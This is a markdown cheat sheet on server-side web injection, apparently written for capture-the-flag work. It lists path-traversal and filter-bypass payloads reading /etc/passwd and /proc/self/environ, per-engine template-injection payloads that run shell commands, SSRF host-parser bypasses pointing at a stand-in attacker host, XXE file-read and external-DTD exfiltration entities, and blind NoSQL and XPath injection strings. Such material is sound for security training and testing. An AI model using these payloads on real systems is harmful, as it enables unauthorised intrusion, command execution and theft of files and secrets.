# Server-Side Injection and Fetch Abuse

Use this reference for server-side web flaws that start from input crossing trust boundaries into templates, file operations, parsers, fetchers, interpreters, or internal APIs.

## Table of Contents
- [Fast triage](#fast-triage)
- [File and path handling](#file-and-path-handling)
- [SSTI and expression injection](#ssti-and-expression-injection)
- [SSRF and server-side fetchers](#ssrf-and-server-side-fetchers)
- [XXE, GraphQL, and parser abuse](#xxe-graphql-and-parser-abuse)
- [Type juggling and loose validation](#type-juggling-and-loose-validation)
- [Command and query-adjacent injection](#command-and-query-adjacent-injection)
- [NoSQL / XPath / adjacent query injection](#nosql--xpath--adjacent-query-injection)

## Fast triage

Map server-side input by sink type:
1. file read/include/template path
2. template or expression renderer
3. server-side fetcher / webhook / preview / importer
4. XML, YAML, GraphQL, archive, or document parser
5. shell, subprocess, or report/export job

Then ask:
- does input become code, path, URL, or query fragment?
- what quiet oracle exists: error, body diff, timing, callback, file write?

## File and path handling

First-line checks:
- LFI / traversal in downloads, previews, logs, templates, reports
- `php://filter` or wrapper support
- recursive decode or normalization bypasses
- mixed separators, Unicode dots/slashes, overlong prefixes, `....//`
- symlink or archive extraction abuse

Useful default probe:

```text
../../../../etc/passwd
php://filter/convert.base64-encode/resource=index
```

Payload flavors worth cycling on filter surprises:

```text
../../../etc/passwd              # baseline
....//....//....//etc/passwd     # strip-once filter defeat
..%2f..%2f..%2fetc/passwd        # URL-encoded slash — often bypasses nginx route match while filesystem still resolves
%252e%252e%252f                  # double URL-encoded — beats one-pass decoders
{.}{.}/flag.txt                  # shell/brace-stripping filter bypass
```

Filesystem-layer footguns to remember:
- Python `os.path.join('/app/public', '/etc/passwd')` returns `/etc/passwd` — an absolute right-hand arg discards the left.
- `basename()` only strips directories; it does not filter hidden files in the same directory (`../db/.lock` still resolves).
- Windows 8.3 short filenames (`FILEFO~1.EXT`) bypass path filters that check the long filename.
- `/dev/fd` symlinks to `/proc/self/fd`, so `/dev/fd/../environ` reaches `/proc/self/environ` when `/proc` is blacklisted directly.
- SQLite / on-disk path checks: `/../gamesim_GM` fails a `== "GM"` string equality but the filesystem normalizes `/var/db/gamesim_/../gamesim_GM.db` — the block runs on the *pre-normalized* string.

## SSTI and expression injection

Distinguish engine first, then payload.

Engines seen in web CTFs:
- Jinja2 / Flask
- Twig
- Mako
- EJS / ERB
- Go templates
- Smarty / Thymeleaf / Vue server render paths

Operator rule:
- confirm evaluation with smallest expression,
- identify available object graph,
- pivot to file read or command exec only as needed.

**Engine fingerprinting from a single probe:**

| Probe | Jinja2 | Twig | Mako | ERB |
|-------|--------|------|------|-----|
| `{{7*7}}` | `49` | `49` | error | error |
| `{{7*'7'}}` | `49` (int×str repeat error or 49) | `7777777` (string repeat) | error | error |
| `${7*7}` | ignored | ignored | `49` | error |
| `<%= 7*7 %>` | ignored | ignored | Mako alt form | `49` |

Fast RCE per engine:

```jinja
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
```python
# Mako (Python) — no sandbox, plain Python in ${...} or <% %>
${__import__('os').popen('id').read()}
```
```twig
{{ ['id']|map('system')|join }}
```
```html
<%- global.process.mainModule.require('child_process').execSync('id') %>   {# EJS #}
```
```erb
<%= Sequel::DATABASES.first[:table].all %>   {# Sinatra ERB — global via Sequel bypasses sandbox variable-name filters #}
```

**Filter-bypass patterns:**
- Quote-blocking sanitizers on Jinja2: use `__dict__.update(key=value)` — keyword arguments need no quotes: `{{obj.__dict__.update(attr=value) or obj.name}}`.
- **Python `str.format()` attribute traversal** (distinct from SSTI): when user input reaches `.format(obj)`, `{0.attr.subattr}` and `{0[key]}` leak arbitrary attributes without a template engine — check secrets, config, or `__globals__` reachable from a single passed object.
- **Thymeleaf SpEL (Spring)**: shell often blocked, use pure Java: `${T(org.springframework.util.FileCopyUtils).copyToByteArray(new java.io.File("/flag.txt"))}`. Works in distroless containers with no shell.

## SSRF and server-side fetchers

Map every place the app fetches attacker-influenced URLs:
- webhooks
- previews
- image/PDF/document renderers
- importers and crawlers
- SSRF via redirects, header smuggling, alternative schemes, DNS rebinding

High-value targets:
- loopback services
- metadata endpoints
- Docker / K8s control APIs
- internal admin panels
- non-HTTP handlers if parser differentials allow them

**Loopback / metadata address variants** worth cycling when a single form is blacklisted:

```text
127.0.0.1  localhost  127.1  0.0.0.0  [::1]
127.0.0.1.nip.io   2130706433   0x7f000001
```

**Parser-differential SSRF (fetcher vs validator):**
- **PHP `parse_url()` `@` bypass**: `http://allowed.com@attacker.com/` — validator extracts `allowed.com` as host, curl connects to `attacker.com`.
- **Double-`@` discrepancy** (distinct from single-`@`): `http://x:x@127.0.0.1:80@allowed.host/path` — `parse_url()` reports `allowed.host` while curl / libcurl connects to `127.0.0.1`. Try both when the app claims to whitelist by parsed host.
- **DNS rebinding for TOCTOU**: <https://lock.cmpxchg8b.com/rebinder.html> — validator resolves once, fetcher resolves again after the TTL flips.
- **Host-header SSRF**: apps that build internal URLs from the request `Host` header (e.g., Go `http.Get("http://" + r.Host + "/validate")`) fetch attacker-controlled origins when `Host` is manipulated.

## XXE, GraphQL, and parser abuse

Keep a parser-first mindset.

XXE:
- inline entities
- external DTDs for OOB
- document upload formats like DOCX/XML containers

Baseline probe and PHP filter escalation:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
```

- **DOCX / Office uploads are ZIP+XML**: inject XXE inside `[Content_Types].xml` or `word/document.xml` before repackaging. Parsers that resolve external entities on ingest trigger even without rendering.
- **XML injection via headers** (`X-Forwarded-For` and friends): when a server builds XML from headers without escaping, `X-Forwarded-For: 1.2.3.4</ip><admin>true</admin><ip>1.2.3.4` produces a document where XML first-tag-wins parsing elevates the injected `<admin>true</admin>`.
- **External-DTD hosting** bypasses keyword filters that block inline entities — host the DTD off-target, reference it with `<!DOCTYPE root SYSTEM "http://attacker/x.dtd">`, and use OOB (DNS/HTTP callback) for blind extraction.

GraphQL:
- introspection
- field-level auth gaps
- batching, aliases, and nested object abuse
- GET/POST mismatch and persisted-query behavior
- subscription/WebSocket transport (`graphql-ws`, `subscriptions-transport-ws`): auth is bound at `connection_init.payload`, not per-message — check Origin enforcement, session takeover after upgrade, HTTP-layer WAF bypass via subscription payloads, and forbidden fields exposed only through the subscription schema

Other parser classes:
- XPath / XML injection
- PHP variable variables
- regex and uniqid misuse
- Office/archive processing and secondary extraction paths

## Type juggling and loose validation

Still common in web CTFs:
- PHP loose comparisons
- `strcmp(array, string)` / NULL truthiness
- JSON number vs string confusion
- weak signature truncation or prefix-only compare
- leading-number integer casts

Rule:
- test `0`, `[]`, empty strings, arrays, scientific-notation magic values, and type-swapped JSON bodies.

**PHP type-juggling cheatsheet** (loose `==` performs type coercion):

| Payload | Compares to | Result |
|---------|-------------|--------|
| `0 == "any-non-numeric-string"` | strings without leading digits | `true` (< PHP 8) |
| `"0e123" == "0e456"` | magic hashes (both parse as scientific) | `true` |
| `strcmp([], "str")` | array vs string | `NULL` → passes `!strcmp()` |
| JSON `{"password": 0}` | vs stored string password | may pass with loose `==` |
| `"1abc" == 1` | truncated numeric cast | `true` |

Defense: `===`. Attack: send JSON integer / array / magic-hash values into fields that end up in a loose `==` check.

## Command and query-adjacent injection

Before full RCE, check smaller adjacent wins:
- command wrappers with quoting mistakes
- GraphQL resolver injection into internal calls
- NoSQL / AQL fragments inside filters and merges
- SQL routed elsewhere -> use `sql-injection.md`

## NoSQL / XPath / adjacent query injection

**MongoDB regex / `$where` blind injection**: when a query lands in a regex context (`{"user": {"$regex": "^"+input+"$"}}`), close and re-open the regex to smuggle a boolean: `a^/)||(this.password.startsWith("f"))||(/a^`. Binary-search `charCodeAt()` on each position for extraction. `$where` accepts JavaScript — same technique, JS instead of regex.

**XPath blind injection**: response-length oracle on `substring(normalize-space(../../../node()),1,1)='a'`. Iterate character-by-character; `normalize-space` collapses whitespace so `substring` indexes align with visible chars.

**AQL / merge-based** (ArangoDB and similar): if the app merges attacker JSON into a query fragment, attribute injection (`{"role":"admin"}` inside a filter object) rewrites the WHERE clause.

## See also

- `sql-injection.md` — dedicated SQLi reference
- `server-execution.md` — code-exec, deserialization, upload-to-RCE, advanced framework chains
